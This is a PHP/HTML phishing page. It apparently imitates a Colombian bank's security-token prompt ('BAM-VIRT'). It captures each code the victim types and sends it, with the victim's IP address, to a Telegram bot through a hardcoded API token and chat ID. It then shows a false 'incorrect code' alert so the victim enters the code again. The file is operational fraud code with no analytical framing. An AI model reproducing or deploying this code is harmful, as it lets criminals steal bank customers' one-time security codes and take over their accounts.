<?php
session_start();
if( isset( $_POST['clv'] ) ){
        
    $_SESSION['COD'] = $_POST['clv'];
    
    @$message = "SMS BAM-VIRT/ \n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'TOKEN 1* : '.$_SESSION['COD'];

    $apiToken = "7416091120:AAHB2mjzCxt6PufGAmfueF8OdyYW9gcUpsM";

    $data = [
        'chat_id' => '-4530783174',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 
	
	
}else{
    // @header('Location: index3.php');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">
    


        <script >
         
            alert("El codigo enviado es incorrecto, por favor verifique con su método de seguridad.");
          </script>


<center>

<form class="form" action="" method="post">

<img src="bm-icon.svg" alt="">


<br><br>

<img class="title" src="title.png" alt="">


<br><br>


<div class="caja1">


    <img class="ic" src="sg.png" alt="">
<input name="clv" required class="ip1" type="text" placeholder="Ingresa tu Token">

 
<img class="olv" src="olv.png" alt="">
 
</div>
<a style="font-size: 10px; color: #7d7c77;" href="/cr.php">¿No ha ecibido un código de seguridad o tienes problemas para continuar? Click aqui.</a>
<br><br>

<input class="btn" type="submit" value="CONTINUAR">

<br>

<img class="pp" src="reg.png" alt="">





</form>

<br>

<img class="of"  style="margin-left: -4px;" width="100%" src="imgg.png" alt="">


<br>


<img style="width: 200px;" src="terminos.png" alt="">

<br>

<img style="width: 450px;" src="copy.png" alt="">










</body>
</html>